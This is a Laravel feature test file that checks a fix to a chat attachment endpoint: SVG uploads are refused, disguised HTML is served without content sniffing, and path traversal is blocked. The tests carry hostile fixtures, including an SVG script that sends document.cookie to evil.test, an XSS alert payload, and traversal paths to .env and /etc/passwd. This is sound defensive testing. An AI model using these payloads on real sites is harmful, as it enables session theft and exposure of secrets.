<?php

namespace Tests\Feature;

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

/**
 * The chat attachment pipeline's security contract.
 *
 * The serve endpoint used to sniff Content-Type from file CONTENT and serve
 * everything inline — so an HTML payload wearing a .jpg name came back as
 * text/html and executed in this app's origin with the viewer's session, and
 * an uploaded SVG (a script container wearing an image extension) did the
 * same. These tests pin the fix: declared-by-extension types, nosniff,
 * downloads for anything that isn't safe media, SVG refused at upload, and
 * clean 403s for traversal attempts.
 */
class ChannelAttachmentSecurityTest extends TestCase
{
    use RefreshDatabase;

    private function staff(): User
    {
        $user = User::factory()->create();
        Sanctum::actingAs($user);

        return $user;
    }

    private function upload(UploadedFile $file)
    {
        return $this->post('/api/v1/admin/channels/attachments', ['file' => $file]);
    }

    public function test_svg_uploads_are_refused(): void
    {
        $this->staff();
        $svg = UploadedFile::fake()->createWithContent(
            'diagram.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><script>document.location="https://evil.test/"+document.cookie</script></svg>'
        );

        $this->upload($svg)->assertStatus(422);
    }

    public function test_html_wearing_a_jpg_name_is_served_as_an_image_never_sniffed(): void
    {
        $this->staff();
        Storage::fake('local');

        // The upload whitelists by extension, so a lying file can get in —
        // the SERVE side must therefore never trust its content.
        $fake = UploadedFile::fake()->createWithContent(
            'photo.jpg',
            '<!doctype html><script>alert(document.cookie)</script>'
        );
        $path = $this->upload($fake)->assertStatus(201)->json('path');

        $resp = $this->get('/api/v1/admin/channels/attachments/serve?path=' . urlencode($path));
        $resp->assertOk();
        $resp->assertHeader('Content-Type', 'image/jpeg');
        $resp->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertStringStartsWith('inline', $resp->headers->get('Content-Disposition'));
    }

    public function test_documents_download_rather_than_render(): void
    {
        $this->staff();
        Storage::fake('local');

        $doc  = UploadedFile::fake()->createWithContent('notes.txt', 'hello');
        $path = $this->upload($doc)->assertStatus(201)->json('path');

        $resp = $this->get('/api/v1/admin/channels/attachments/serve?path=' . urlencode($path));
        $resp->assertOk();
        $resp->assertHeader('Content-Type', 'application/octet-stream');
        $this->assertStringStartsWith('attachment', $resp->headers->get('Content-Disposition'));
    }

    public function test_pdfs_stay_viewable_inline(): void
    {
        $this->staff();
        Storage::fake('local');

        $pdf  = UploadedFile::fake()->createWithContent('quote.pdf', '%PDF-1.4 fake');
        $path = $this->upload($pdf)->assertStatus(201)->json('path');

        $resp = $this->get('/api/v1/admin/channels/attachments/serve?path=' . urlencode($path));
        $resp->assertOk();
        $resp->assertHeader('Content-Type', 'application/pdf');
        $this->assertStringStartsWith('inline', $resp->headers->get('Content-Disposition'));
        // The sandbox CSP is skipped for PDFs — it would block the viewer.
        $this->assertNull($resp->headers->get('Content-Security-Policy'));
    }

    public function test_traversal_and_out_of_folder_paths_are_refused(): void
    {
        $this->staff();

        foreach ([
            'channel-attachments/../../../.env',
            '.env',
            '/etc/passwd',
            'channel-attachments/2026/09/../../../secrets.txt',
        ] as $bad) {
            $this->get('/api/v1/admin/channels/attachments/serve?path=' . urlencode($bad))
                ->assertStatus(403);
        }
    }

    public function test_the_serve_endpoint_requires_authentication(): void
    {
        $resp = $this->getJson('/api/v1/admin/channels/attachments/serve?path=' . urlencode('channel-attachments/x.jpg'));
        $this->assertContains($resp->status(), [401, 403], 'Attachments must not be readable without a session.');
    }
}
